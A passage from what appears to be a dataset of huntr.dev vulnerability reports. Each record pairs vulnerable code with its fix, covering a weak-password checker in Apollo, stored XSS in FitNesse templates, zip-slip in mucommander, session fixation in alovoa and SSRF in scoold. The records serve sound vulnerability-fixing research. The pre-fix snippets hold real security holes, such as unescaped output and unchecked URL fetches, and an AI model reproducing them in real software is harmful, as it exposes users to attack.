                                             @RequestParam(value = ""limit"", defaultValue = ""10"") int limit) {
      @RequestParam(value = ""offset"", defaultValue = ""0"") int offset,
      @RequestParam(value = ""limit"", defaultValue = ""10"") int limit) {
    return userService.searchUsers(keyword, offset, limit);
  }

@@ -91,5 +98,4 @@ public UserInfo getUserByUserId(@PathVariable String userId) {
    return userService.findByUserId(userId);
  }


}
68
...src/main/java/com/ctrip/framework/apollo/portal/util/checker/AuthUserPasswordChecker.java
@@ -0,0 +1,68 @@
/*
 * Copyright 2021 Apollo Authors
 *
 * Licensed under the Apache License, Version 2.0 (the ""License"");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an ""AS IS"" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 */
package com.ctrip.framework.apollo.portal.util.checker;

import com.google.common.base.Strings;
import java.util.Arrays;
import java.util.List;
import java.util.regex.Pattern;
import org.springframework.stereotype.Component;

@Component
public class AuthUserPasswordChecker implements UserPasswordChecker {

  private static final Pattern PWD_PATTERN = Pattern
      .compile(""^(?=.*[0-9].*)(?=.*[a-zA-Z].*).{8,20}$"");

  private static final List<String> LIST_OF_CODE_FRAGMENT = Arrays.asList(
      ""111"", ""222"", ""333"", ""444"", ""555"", ""666"", ""777"", ""888"", ""999"", ""000"",
      ""001122"", ""112233"", ""223344"", ""334455"", ""445566"", ""556677"", ""667788"", ""778899"", ""889900"",
      ""009988"", ""998877"", ""887766"", ""776655"", ""665544"", ""554433"", ""443322"", ""332211"", ""221100"",
      ""0123"", ""1234"", ""2345"", ""3456"", ""4567"", ""5678"", ""6789"", ""7890"",
      ""0987"", ""9876"", ""8765"", ""7654"", ""6543"", ""5432"", ""4321"", ""3210"",
      ""1q2w"", ""2w3e"", ""3e4r"", ""5t6y"", ""abcd"", ""qwer"", ""asdf"", ""zxcv""
  );

  @Override
  public CheckResult checkWeakPassword(String password) {
    if (!PWD_PATTERN.matcher(password).matches()) {
      return new CheckResult(Boolean.FALSE,
          ""Password needs a number and letter and between 8~20 characters"");
    }
    if (isCommonlyUsed(password)) {
      return new CheckResult(Boolean.FALSE,
          ""Passwords cannot be consecutive, regular letters or numbers. And cannot be commonly used. ""
              + ""e.g: abcd1234, 1234qwer, 1q2w3e4r, 1234asdfghjk, ..."");
    }
    return new CheckResult(Boolean.TRUE, null);
  }

  /**
   * @return The password contains code fragment or is blank.
   */
  private boolean isCommonlyUsed(String password) {
    if (Strings.isNullOrEmpty(password)) {
      return true;
    }
    for (String s : LIST_OF_CODE_FRAGMENT) {
      if (password.toLowerCase().contains(s)) {
        return true;
      }
    }
    return false;
  }
}
36
apollo-portal/src/main/java/com/ctrip/framework/apollo/portal/util/checker/CheckResult.java
@@ -0,0 +1,36 @@
/*
 * Copyright 2021 Apollo Authors
 *
 * Licensed under the Apache License, Version 2.0 (the ""License"");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an ""AS IS"" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 */
package com.ctrip.framework.apollo.portal.util.checker;

public class CheckResult {

  private final boolean success;
  private final String message;

  public CheckResult(boolean success, String message) {
    this.success = success;
    this.message = message;
  }

  public boolean isSuccess() {
    return success;
  }

  public String getMessage() {
    return message;
  }
}
22
...tal/src/main/java/com/ctrip/framework/apollo/portal/util/checker/UserPasswordChecker.java
@@ -0,0 +1,22 @@
/*
 * Copyright 2021 Apollo Authors
 *
 * Licensed under the Apache License, Version 2.0 (the ""License"");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an ""AS IS"" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 */
package com.ctrip.framework.apollo.portal.util.checker;

public interface UserPasswordChecker {

  CheckResult checkWeakPassword(String password);
}
73
...al/src/test/java/com/ctrip/framework/apollo/portal/controller/UserInfoControllerTest.java
@@ -0,0 +1,73 @@
/*
 * Copyright 2021 Apollo Authors
 *
 * Licensed under the Apache License, Version 2.0 (the ""License"");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an ""AS IS"" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 */
package com.ctrip.framework.apollo.portal.controller;

import com.ctrip.framework.apollo.common.exception.BadRequestException;
import com.ctrip.framework.apollo.portal.entity.po.UserPO;
import com.ctrip.framework.apollo.portal.spi.springsecurity.SpringSecurityUserService;
import com.ctrip.framework.apollo.portal.util.checker.AuthUserPasswordChecker;
import com.ctrip.framework.apollo.portal.util.checker.CheckResult;
import org.junit.Assert;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.mockito.InjectMocks;
import org.mockito.Mock;
import org.mockito.Mockito;
import org.mockito.junit.MockitoJUnitRunner;

@RunWith(MockitoJUnitRunner.class)
public class UserInfoControllerTest {

  @InjectMocks
  private UserInfoController userInfoController;
  @Mock
  private SpringSecurityUserService userService;
  @Mock
  private AuthUserPasswordChecker userPasswordChecker;

  @Test
  public void testCreateOrUpdateUser() {
    UserPO user = new UserPO();
    user.setUsername(""username"");
    user.setPassword(""password"");

    Mockito.when(userPasswordChecker.checkWeakPassword(Mockito.anyString()))
        .thenReturn(new CheckResult(Boolean.TRUE, """"));

    userInfoController.createOrUpdateUser(user);
  }

  @Test(expected = BadRequestException.class)
  public void testCreateOrUpdateUserFailed() {
    UserPO user = new UserPO();
    user.setUsername(""username"");
    user.setPassword(""password"");

    String msg = ""fake error message"";

    Mockito.when(userPasswordChecker.checkWeakPassword(Mockito.anyString()))
        .thenReturn(new CheckResult(Boolean.FALSE, msg));

    try {
      userInfoController.createOrUpdateUser(user);
    } catch (BadRequestException e) {
      Assert.assertEquals(msg, e.getMessage());
      throw e;
    }
  }

}
84
...tal/src/test/java/com/ctrip/framework/apollo/portal/util/AuthUserPasswordCheckerTest.java
@@ -0,0 +1,84 @@
/*
 * Copyright 2021 Apollo Authors
 *
 * Licensed under the Apache License, Version 2.0 (the ""License"");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an ""AS IS"" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 */
package com.ctrip.framework.apollo.portal.util;

import com.ctrip.framework.apollo.portal.util.checker.AuthUserPasswordChecker;
import com.ctrip.framework.apollo.portal.util.checker.CheckResult;
import java.util.Arrays;
import java.util.List;
import org.junit.Assert;
import org.junit.Before;
import org.junit.Test;

public class AuthUserPasswordCheckerTest {

  private AuthUserPasswordChecker checker;

  @Before
  public void setup() {
    checker = new AuthUserPasswordChecker();
  }

  @Test
  public void testRegexMatch() {
    List<String> unMatchList = Arrays.asList(
        ""11111111"",
        ""oibjdiel"",
        ""oso87b6"",
        ""0vb9xibowkd8bz9dsxbef""
    );
    String exceptedErrMsg = ""Password needs a number and letter and between 8~20 characters"";

    for (String p : unMatchList) {
      CheckResult res = checker.checkWeakPassword(p);
      Assert.assertFalse(res.isSuccess());
      Assert.assertEquals(exceptedErrMsg, res.getMessage());
    }

    List<String> matchList = Arrays.asList(
        ""pziv0g87"",
        ""8f7zjpf8sci93"",
        ""Upz4jF8u2yjV3wn8zp6c""
    );

    for (String p : matchList) {
      CheckResult res = checker.checkWeakPassword(p);
      Assert.assertTrue(res.isSuccess());
    }
  }

  @Test
  public void testIsWeakPassword() {
    List<String> weakPwdList = Arrays.asList(
        ""a1234567"", ""b98765432"", ""c11111111"", ""d2222222"", ""e3333333"", ""f4444444"",
        ""g5555555"", ""h6666666"", ""i7777777"", ""j8888888"", ""k9999999"", ""l0000000"",
        ""1q2w3e4r"", ""qwertyuiop1"", ""asdfghjkl2"", ""asdfghjkl3"", ""abcd1234""
    );
    String exceptedErrMsg =
        ""Passwords cannot be consecutive, regular letters or numbers. And cannot be commonly used."";

    for (String p : weakPwdList) {
      CheckResult res = checker.checkWeakPassword(p);
      Assert.assertFalse(res.isSuccess());
      Assert.assertTrue(res.getMessage().startsWith(exceptedErrMsg));
    }

    CheckResult res = checker.checkWeakPassword(""1s39gvisk"");
    Assert.assertTrue(res.isSuccess());
  }

}"
https://huntr.dev/bounties/8f7d359c-91fe-4c9f-9700-348986f258b1/,Cross-site Scripting (XSS) - Stored in unclebob/fitnesse,Stored XSS in FileName allows for arbitrary execution of JavaScript,,CWE-79: Cross-site Scripting (XSS) - Stored,https://www.github.com/unclebob/fitnesse/commit/cc7e58af5f53be4a99219fee4b379246189c24ec,"@@ -5,7 +5,7 @@

<ol class=""breadcrumb"">
#foreach($breadCrumb in $pageTitle.BreadCrumbs)
 <li><a href=""${contextRoot}$breadCrumb.Link"">$breadCrumb.Name</a></li>
#end
 <li>#if($pageTitle.Link)<a href=""${contextRoot}$pageTitle.Link"">$pageTitle.Title</a>#else$pageTitle.Title#end#if($pageTitle.pageTags) #foreach($tag in $!pageTitle.pageTagsArray)<span class=""tag"">$tag</span>#end#end</li>
</ol>
@@ -1,7 +1,7 @@
#macro( prettyPrint $s )
 #if( $s.length() > 60 )
  #set ( $t = $s.length() - 40 )
  $s.substring(0, 15)...$s.substring($t)#else${s}#end
#end
<table class=""dirListing"">
 <thead>
@@ -16,14 +16,14 @@
 #foreach( $fileInfo in $fileInfoList )
  <tr >
   <td>
 <a href=""$fileInfo.name#if( $fileInfo.directory )/#end"">
  #if( $fileInfo.directory )<img src=""${contextRoot}files/fitnesse/images/folder.gif"" alt=""folder""/>#end #prettyPrint( $fileInfo.name )#if( $fileInfo.directory )/#end
 </a>
   </td>
   <td>$fileInfo.size</td>
   <td>$fileInfo.date</td>
   <td class=""buttons"">
    <a href=""?responder=renameConfirmation&filename=$fileInfo.name"">Rename</a>&nbsp;|&nbsp;<a href=""?responder=deleteConfirmation&filename=$fileInfo.name"">Delete</a>
   </td>
  </tr>
 #end
@@ -50,4 +50,4 @@
 <fieldset class=""buttons"">
  <input type=""submit"" name="""" value=""Create""/>
 </fieldset>
</form>
@@ -1,12 +1,12 @@
 <form method=""post"" action=""?"">
  <input type=""hidden"" name=""responder"" value=""renameFile""/>
  <input type=""hidden"" name=""filename"" value=""$filename""/>
  <fieldset  class=""buttons"">
    <p>Rename <b>$filename</b>.</p>
  </fieldset>
  <fieldset>
    <label for=""rename-file"">Rename to:</label>
    <input id=""rename-file"" type=""text"" name=""newName"" value=""$filename""/>
  </fieldset>
  <fieldset  class=""buttons"">
      <input type=""submit"" name=""renameFile"" value=""Rename""/>

","4
src/fitnesse/resources/bootstrap/templates/breadcrumb.vm
@@ -5,7 +5,7 @@

<ol class=""breadcrumb"">
#foreach($breadCrumb in $pageTitle.BreadCrumbs)
 <li><a href=""${contextRoot}$breadCrumb.Link"">$breadCrumb.Name</a></li>
 <li><a href=""${contextRoot}#escape($breadCrumb.Link)"">#escape($breadCrumb.Name)</a></li>
#end
 <li>#if($pageTitle.Link)<a href=""${contextRoot}$pageTitle.Link"">$pageTitle.Title</a>#else$pageTitle.Title#end#if($pageTitle.pageTags) #foreach($tag in $!pageTitle.pageTagsArray)<span class=""tag"">$tag</span>#end#end</li>
 <li>#if($pageTitle.Link)<a href=""${contextRoot}#escape($pageTitle.Link)"">#escape($pageTitle.Title)</a>#else#escape($pageTitle.Title)#end#if($pageTitle.pageTags) #foreach($tag in $!pageTitle.pageTagsArray)<span class=""tag"">#escape($tag)</span>#end#end</li>
</ol>
8
src/fitnesse/resources/templates/directoryPage.vm
@@ -1,7 +1,7 @@
#macro( prettyPrint $s )
 #if( $s.length() > 60 )
  #set ( $t = $s.length() - 40 )
  $s.substring(0, 15)...$s.substring($t)#else${s}#end
  #escape($s.substring(0, 15))...#escape($s.substring($t))#else#escape(${s})#end
#end
<table class=""dirListing"">
 <thead>
@@ -16,14 +16,14 @@
 #foreach( $fileInfo in $fileInfoList )
  <tr >
   <td>
 <a href=""$fileInfo.name#if( $fileInfo.directory )/#end"">
 <a href=""#escape($fileInfo.name)#if( $fileInfo.directory )/#end"">
  #if( $fileInfo.directory )<img src=""${contextRoot}files/fitnesse/images/folder.gif"" alt=""folder""/>#end #prettyPrint( $fileInfo.name )#if( $fileInfo.directory )/#end
 </a>
   </td>
   <td>$fileInfo.size</td>
   <td>$fileInfo.date</td>
   <td class=""buttons"">
    <a href=""?responder=renameConfirmation&filename=$fileInfo.name"">Rename</a>&nbsp;|&nbsp;<a href=""?responder=deleteConfirmation&filename=$fileInfo.name"">Delete</a>
    <a href=""?responder=renameConfirmation&filename=#escape($fileInfo.name)"">Rename</a>&nbsp;|&nbsp;<a href=""?responder=deleteConfirmation&filename=#escape($fileInfo.name)"">Delete</a>
   </td>
  </tr>
 #end
@@ -50,4 +50,4 @@
 <fieldset class=""buttons"">
  <input type=""submit"" name="""" value=""Create""/>
 </fieldset>
</form>
</form>
6
src/fitnesse/resources/templates/renameFileConfirmation.vm
@@ -1,12 +1,12 @@
 <form method=""post"" action=""?"">
  <input type=""hidden"" name=""responder"" value=""renameFile""/>
  <input type=""hidden"" name=""filename"" value=""$filename""/>
  <input type=""hidden"" name=""filename"" value=""#escape($filename)""/>
  <fieldset  class=""buttons"">
    <p>Rename <b>$filename</b>.</p>
    <p>Rename <b>#escape($filename)</b>.</p>
  </fieldset>
  <fieldset>
    <label for=""rename-file"">Rename to:</label>
    <input id=""rename-file"" type=""text"" name=""newName"" value=""$filename""/>
    <input id=""rename-file"" type=""text"" name=""newName"" value=""#escape($filename)""/>
  </fieldset>
  <fieldset  class=""buttons"">
      <input type=""submit"" name=""renameFile"" value=""Rename""/>"
https://huntr.dev/bounties/1-other-mucommander/,Path Traversal in mucommander/mucommander,"mucommander A lightweight, cross-platform file manager with a dual-pane interface. This package is vulnerable for zip-slip.",,CWE-22: Path Traversal,https://www.github.com/mucommander/mucommander/commit/d1ae0d29330395923cc561853267f1fd897c8bb4,"@@ -33,7 +33,6 @@
import com.mucommander.ui.dialog.file.ProgressDialog;
import com.mucommander.ui.main.MainFrame;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.nio.file.FileSystems;
@@ -251,10 +250,18 @@ else if(entryPath.equals(selectedEntry.getPath())) {
                // Create destination AbstractFile instance
                AbstractFile destFile = destFolder.getChild(relDestPath);






                //Check for ZipSlip
                if(!checkForZipSlip(destFile, destFolder))



                    return false;


                // Check if the file does not already exist in the destination
                destFile = checkForCollision(entryFile, destFolder, destFile, false);
@@ -317,26 +324,6 @@ else if(entryPath.equals(selectedEntry.getPath())) {
        return false;
    }

    /** This methods checks for a zipSlip attack.
     * It is inspired by the mitigation shown in https://snyk.io/research/zip-slip-vulnerability.
     * @param destFile destination file to unpack to.
     * @param destFolder destionation folder where the file is put.
     * @return false if file is outside the target unpack fodler, true if everything is fine.
     **/
    private boolean checkForZipSlip(AbstractFile destFile, AbstractFile destFolder) {

        String canonicalDestinationDirPath = destFolder.getCanonicalPath();
        if (!canonicalDestinationDirPath.endsWith(File.separator)) {
            canonicalDestinationDirPath = canonicalDestinationDirPath + File.separator;
        }
        String canonicalDestinationFile = destFile.getCanonicalPath();
        if (!canonicalDestinationFile.startsWith(canonicalDestinationDirPath)) {
            showErrorDialog(errorDialogTitle, Translator.get(""entry_outside_of_target_dir"", destFile.getName()));
            return false;
        }
        return true;
    }

    // This job modifies the base destination folder and its subfolders
    @Override
    protected boolean hasFolderChanged(AbstractFile folder) {

@@ -765,6 +765,7 @@ move_dialog.cannot_move_to_itself = Cannot move files to a subfolder.
pack.error_on_file = Error while compressing {0}
pack_dialog.cannot_write = Unable to create file in destination folder.
unpack.unable_to_open_zip = Unable to open zip file {0}.

image_viewer.previous_image = Previous image
image_viewer.next_image = Next image
mkdir_dialog.title = Make directory
@@ -787,4 +788,3 @@ delete.delete_link_only = Delete link
delete.delete_linked_folder = Delete folder
Unpack.label = Unpack files
Pack.label = Pack files
entry_outside_of_target_dir=Entry is outside of the target dir: {0}
@@ -763,6 +763,7 @@ move_dialog.cannot_move_to_itself = Cannot move files to a subfolder.
pack.error_on_file = Error while compressing {0}
pack_dialog.cannot_write = Unable to create file in destination folder.
unpack.unable_to_open_zip = Unable to open zip file {0}.

image_viewer.previous_image = Previous image
image_viewer.next_image = Next image
mkdir_dialog.title = Make directory

@@ -43,6 +43,7 @@ Improvements:
- Symbolic links are unpacked from tar archives.
- The portable version stores preferences files in the installation directory.
- It is now possible to change the modification date of multiple search results.


Localization:
- Updated Russian translation

","33
mucommander-core/src/main/java/com/mucommander/job/impl/UnpackJob.java
@@ -33,7 +33,6 @@
import com.mucommander.ui.dialog.file.ProgressDialog;
import com.mucommander.ui.main.MainFrame;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.nio.file.FileSystems;
@@ -251,10 +250,18 @@ else if(entryPath.equals(selectedEntry.getPath())) {
                // Create destination AbstractFile instance
                AbstractFile destFile = destFolder.getChild(relDestPath);

                // Check for ZipSlip (see https://snyk.io/research/zip-slip-vulnerability)
                do {
                    if (destFolder.isParentOf(destFile))
                        break;

                //Check for ZipSlip
                if(!checkForZipSlip(destFile, destFolder))
                    int ret = showErrorDialog(errorDialogTitle, Translator.get(""unpack.entry_out_of_target_dir"", destFile.getName()));
                    // Retry loops
                    if(ret==FileJobAction.RETRY)
                        continue;
                    // Cancel, skip or close dialog returns false
                    return false;
                } while(true);

                // Check if the file does not already exist in the destination
                destFile = checkForCollision(entryFile, destFolder, destFile, false);
@@ -317,26 +324,6 @@ else if(entryPath.equals(selectedEntry.getPath())) {
        return false;
    }

    /** This methods checks for a zipSlip attack.
     * It is inspired by the mitigation shown in https://snyk.io/research/zip-slip-vulnerability.
     * @param destFile destination file to unpack to.
     * @param destFolder destionation folder where the file is put.
     * @return false if file is outside the target unpack fodler, true if everything is fine.
     **/
    private boolean checkForZipSlip(AbstractFile destFile, AbstractFile destFolder) {

        String canonicalDestinationDirPath = destFolder.getCanonicalPath();
        if (!canonicalDestinationDirPath.endsWith(File.separator)) {
            canonicalDestinationDirPath = canonicalDestinationDirPath + File.separator;
        }
        String canonicalDestinationFile = destFile.getCanonicalPath();
        if (!canonicalDestinationFile.startsWith(canonicalDestinationDirPath)) {
            showErrorDialog(errorDialogTitle, Translator.get(""entry_outside_of_target_dir"", destFile.getName()));
            return false;
        }
        return true;
    }

    // This job modifies the base destination folder and its subfolders
    @Override
    protected boolean hasFolderChanged(AbstractFile folder) {
2
mucommander-translator/src/main/resources/dictionary.properties
@@ -765,6 +765,7 @@ move_dialog.cannot_move_to_itself = Cannot move files to a subfolder.
pack.error_on_file = Error while compressing {0}
pack_dialog.cannot_write = Unable to create file in destination folder.
unpack.unable_to_open_zip = Unable to open zip file {0}.
unpack.entry_out_of_target_dir = Entry is outside of the target dir: {0}
image_viewer.previous_image = Previous image
image_viewer.next_image = Next image
mkdir_dialog.title = Make directory
@@ -787,4 +788,3 @@ delete.delete_link_only = Delete link
delete.delete_linked_folder = Delete folder
Unpack.label = Unpack files
Pack.label = Pack files
entry_outside_of_target_dir=Entry is outside of the target dir: {0}
1
mucommander-translator/src/main/resources/dictionary_en.properties
@@ -763,6 +763,7 @@ move_dialog.cannot_move_to_itself = Cannot move files to a subfolder.
pack.error_on_file = Error while compressing {0}
pack_dialog.cannot_write = Unable to create file in destination folder.
unpack.unable_to_open_zip = Unable to open zip file {0}.
unpack.entry_out_of_target_dir = Entry is outside of the target dir: {0}
image_viewer.previous_image = Previous image
image_viewer.next_image = Next image
mkdir_dialog.title = Make directory
1
package/readme.txt
@@ -43,6 +43,7 @@ Improvements:
- Symbolic links are unpacked from tar archives.
- The portable version stores preferences files in the installation directory.
- It is now possible to change the modification date of multiple search results.
- Prevention of ZipSlip (https://snyk.io/research/zip-slip-vulnerability)

Localization:
- Updated Russian translation"
https://huntr.dev/bounties/8294ae22-3ada-4098-9923-cd2e9b668037/,Session Fixation in alovoa/alovoa,On changing password both session using which user changes password and old sessions in any other browser or device does not expire and remains active.,,CWE-384: Session Fixation,https://www.github.com/alovoa/alovoa/commit/05cc2be6985ad3582f8a199ebd07a4e5cb5b33b0,"@@ -1,16 +1,27 @@
package com.nonononoki.alovoa.config;




import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.annotation.Bean;
import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;


import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter;
import org.springframework.security.web.authentication.rememberme.TokenBasedRememberMeServices;







import com.nonononoki.alovoa.component.AuthFilter;
import com.nonononoki.alovoa.component.AuthProvider;
@@ -74,6 +85,8 @@ public void configure(HttpSecurity http) throws Exception {
    .addFilterBefore(authenticationFilter(), UsernamePasswordAuthenticationFilter.class).rememberMe()
    .rememberMeServices(rememberMeServices()).key(rememberKey);



  http.csrf().ignoringAntMatchers(""/donate/received/**"");
  http.requiresChannel().anyRequest().requiresSecure();
 }
@@ -90,9 +103,32 @@ public AuthFilter authenticationFilter() throws Exception {
  filter.setAuthenticationSuccessHandler(successHandler);
  filter.setAuthenticationFailureHandler(failureHandler);
  filter.setRememberMeServices(rememberMeServices());

  return filter;
 }























 @Bean
 public TokenBasedRememberMeServices rememberMeServices() throws Exception {
  return new TokenBasedRememberMeServices(rememberKey, customUserDetailsService);

@@ -3,6 +3,8 @@
import java.io.IOException;
import java.security.NoSuchAlgorithmException;
import java.util.Date;



import javax.mail.MessagingException;
import javax.servlet.http.HttpSession;
@@ -11,7 +13,9 @@
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.security.authentication.DisabledException;

import org.springframework.security.crypto.password.PasswordEncoder;

import org.springframework.stereotype.Service;

import com.nonononoki.alovoa.entity.User;
@@ -43,6 +47,9 @@ public class PasswordService {
 @Autowired
 private MailService mailService;




 @Value(""${app.password-token.length}"")
 private int tokenLength;

@@ -98,7 +105,31 @@ public void changePasword(PasswordChangeDto dto, HttpSession session) throws Alo
   user.setRegisterToken(null);
  }


























  userRepo.saveAndFlush(user);
  session.invalidate();
 }
}
","36
src/main/java/com/nonononoki/alovoa/config/SecurityConfig.java
@@ -1,16 +1,27 @@
package com.nonononoki.alovoa.config;

import java.util.ArrayList;
import java.util.List;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.annotation.Bean;
import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;
import org.springframework.security.core.session.SessionRegistry;
import org.springframework.security.core.session.SessionRegistryImpl;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter;
import org.springframework.security.web.authentication.rememberme.TokenBasedRememberMeServices;
import org.springframework.security.web.authentication.session.CompositeSessionAuthenticationStrategy;
import org.springframework.security.web.authentication.session.RegisterSessionAuthenticationStrategy;
import org.springframework.security.web.authentication.session.SessionAuthenticationStrategy;
import org.springframework.security.web.authentication.session.SessionFixationProtectionStrategy;
import org.springframework.security.web.session.SessionInformationExpiredStrategy;
import org.springframework.security.web.session.SimpleRedirectSessionInformationExpiredStrategy;

import com.nonononoki.alovoa.component.AuthFilter;
import com.nonononoki.alovoa.component.AuthProvider;
@@ -74,6 +85,8 @@ public void configure(HttpSecurity http) throws Exception {
    .addFilterBefore(authenticationFilter(), UsernamePasswordAuthenticationFilter.class).rememberMe()
    .rememberMeServices(rememberMeServices()).key(rememberKey);

  http.sessionManagement().maximumSessions(10).expiredSessionStrategy(getSessionInformationExpiredStrategy())
    .sessionRegistry(sessionRegistry());
  http.csrf().ignoringAntMatchers(""/donate/received/**"");
  http.requiresChannel().anyRequest().requiresSecure();
 }
@@ -90,9 +103,32 @@ public AuthFilter authenticationFilter() throws Exception {
  filter.setAuthenticationSuccessHandler(successHandler);
  filter.setAuthenticationFailureHandler(failureHandler);
  filter.setRememberMeServices(rememberMeServices());
  filter.setSessionAuthenticationStrategy(sessionAuthenticationStrategy());
  return filter;
 }

 // cf.
 // https://stackoverflow.com/questions/32463022/sessionregistry-is-empty-when-i-use-concurrentsessioncontrolauthenticationstrate
 public SessionAuthenticationStrategy sessionAuthenticationStrategy() {
  List<SessionAuthenticationStrategy> stratList = new ArrayList<>();
  SessionFixationProtectionStrategy concStrat = new SessionFixationProtectionStrategy();
  stratList.add(concStrat);
  RegisterSessionAuthenticationStrategy regStrat = new RegisterSessionAuthenticationStrategy(sessionRegistry());
  stratList.add(regStrat);
  CompositeSessionAuthenticationStrategy compStrat = new CompositeSessionAuthenticationStrategy(stratList);
  return compStrat;
 }

 public SessionInformationExpiredStrategy getSessionInformationExpiredStrategy() {
  SessionInformationExpiredStrategy strat = new SimpleRedirectSessionInformationExpiredStrategy(""/logout"");
  return strat;
 }

 @Bean
 public SessionRegistry sessionRegistry() {
  return new SessionRegistryImpl();
 }

 @Bean
 public TokenBasedRememberMeServices rememberMeServices() throws Exception {
  return new TokenBasedRememberMeServices(rememberKey, customUserDetailsService);
33
src/main/java/com/nonononoki/alovoa/service/PasswordService.java
@@ -3,6 +3,8 @@
import java.io.IOException;
import java.security.NoSuchAlgorithmException;
import java.util.Date;
import java.util.List;
import java.util.stream.Collectors;

import javax.mail.MessagingException;
import javax.servlet.http.HttpSession;
@@ -11,7 +13,9 @@
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.security.authentication.DisabledException;
import org.springframework.security.core.session.SessionRegistry;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.security.oauth2.core.user.DefaultOAuth2User;
import org.springframework.stereotype.Service;

import com.nonononoki.alovoa.entity.User;
@@ -43,6 +47,9 @@ public class PasswordService {
 @Autowired
 private MailService mailService;

 @Autowired
 private SessionRegistry sessionRegistry;

 @Value(""${app.password-token.length}"")
 private int tokenLength;

@@ -98,7 +105,31 @@ public void changePasword(PasswordChangeDto dto, HttpSession session) throws Alo
   user.setRegisterToken(null);
  }

  List<Object> principals = sessionRegistry.getAllPrincipals().stream().filter(auth -> {
   try {
    String email;
    if (auth instanceof DefaultOAuth2User) {
     DefaultOAuth2User oauth2User = (DefaultOAuth2User) auth;
     email = oauth2User.getAttribute(""email"");
    } else {
     email = (String) auth;
    }
    if (user.getEmail().equals(email)) {
     return true;
    } else {
     return false;
    }
   } catch (Exception e) {
    return false;
   }
  }).collect(Collectors.toList());

  for (Object p : principals) {
   sessionRegistry.getAllSessions(p, false).forEach(sessionInfo -> {
    sessionInfo.expireNow();
   });
  }

  userRepo.saveAndFlush(user);
  session.invalidate();
 }
}"
https://huntr.dev/bounties/f2387827-35bf-4a85-9545-9da9bc63f0a4/,Server-Side Request Forgery (SSRF) in erudika/scoold,Affected URL is vulnerable to Server-Side Request Forgery (SSRF). An attacker is able to bypass a proxy by providing a URL that responds with a redirect to a restricted host or IP address.,,CWE-918: Server-Side Request Forgery (SSRF),https://www.github.com/erudika/scoold/commit/820664d11a15b740e631c24f31f287e5bb47ff96,"@@ -196,6 +196,12 @@ public static String getCookieValue(HttpServletRequest req, String name) {

 /**
  * Fetches an avatar at a given URL.






  * @param url image URL
  * @param req request
  * @param res response
@@ -206,6 +212,9 @@ public static void getAvatar(String url, HttpServletRequest req, HttpServletResp
   getDefaultAvatarImage(res);
   return;
  }



  HttpGet get = new HttpGet(url);
  // attach auth cookie to requests for locally uploaded avatars - without this custom avatars will not be loaded!
  if (StringUtils.startsWithIgnoreCase(url, ScooldServer.getServerURL())) {

@@ -745,6 +745,10 @@ public boolean isDarkModeEnabled() {
  return Config.getConfigBoolean(""dark_mode_enabled"", true);
 }





 public String getFooterHTML() {
  return Config.getConfigParam(""footer_html"", """");
 }
@@ -1328,6 +1332,14 @@ public static String getGravatar(Profile profile) {
  }
 }









 public void clearSession(HttpServletRequest req, HttpServletResponse res) {
  if (req != null) {
   HttpUtils.removeStateParam(AUTH_COOKIE, req, res);

@@ -10,7 +10,9 @@
  <property name=""fileExtensions"" value=""java, xml, properties, js, html, css"" />
 </module>

 <module name=""FileLength""/>



 <module name=""TreeWalker"">
  <module name=""RegexpSinglelineJava"">

@@ -347,6 +347,19 @@ img.profile-pic {
.user-card img.profile-pic {
 width: 100%;
}













.card .card-website a:not(.btn):not(.btn-large):not(.btn-small):not(.btn-large):not(.btn-floating) {
 margin-right: 0;
 text-transform: lowercase;
